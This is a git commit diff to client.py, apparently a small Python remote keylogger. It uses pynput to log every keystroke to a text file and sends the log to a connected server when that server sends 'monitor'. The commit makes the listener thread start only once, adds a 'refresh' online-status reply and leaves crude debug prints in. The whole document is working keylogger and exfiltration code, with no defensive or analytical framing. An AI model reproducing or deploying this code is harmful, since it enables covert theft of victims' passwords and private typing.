05f6658768f5e51199953b1f413f3ce82bbdc870
semihcelik8 <81470723+semihcelik8@users.noreply.github.com>
2022-04-30 13:42:10 +0300

    Update client.py

--- client.py
+++ client.py
@@ -7,6 +7,7 @@ from pynput import keyboard
 file_location = os.getcwd()
 file_is_open = False
 text_file_name = file_location + "\\textfile.txt"
+flag = False
 
 def on_press(key):
     global file_is_open
@@ -17,8 +18,11 @@ def on_press(key):
     print('Key pressed: ' + k)
     with open("textfile.txt", "a+") as file:
         file.write(k)
+
 def listen_keyboard():
+    print("shit")
     listener = keyboard.Listener(on_press=on_press)
+    print("shit2")
     listener.start()
     listener.join()
 
@@ -31,12 +35,19 @@ while True:
         except:
             print("Trying to connect...")
     while True:
-        threading.Thread(target=listen_keyboard).start()
+        if flag == False:
+            threading.Thread(target=listen_keyboard).start()
+            flag = True
         try:
             data = (s.recv(1024)).decode("utf-8")
             if data == "monitor":
                 with open("textfile.txt", "r") as read_file:
                     file_data = read_file.read()
                     s.sendall(file_data.encode("utf-8"))
+            elif data == "refresh":
+                try:
+                    s.sendall("Online".encode("utf-8"))
+                except:
+                    print("[FAILED] Could not send client status to server")
         except:
             break
